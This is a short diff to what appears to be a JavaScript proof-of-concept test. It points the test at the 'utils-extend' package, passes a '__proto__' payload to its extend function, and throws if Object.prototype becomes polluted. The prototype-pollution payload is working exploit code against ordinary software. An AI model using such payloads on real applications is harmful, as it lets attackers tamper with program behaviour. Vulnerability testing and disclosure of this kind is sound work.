@@ -1,10 +1,8 @@
-const lib = require('./vulnerable_slice');
-var someObj = {};
+const lib = require('utils-extend');
 
 let payload = { ["__proto__"]: { "toString": "polluted" } };
 
-lib.extend(someObj, payload);
+lib.extend({}, payload);
 
 if (({}).toString == "polluted")
   throw Error("I pollute");
-
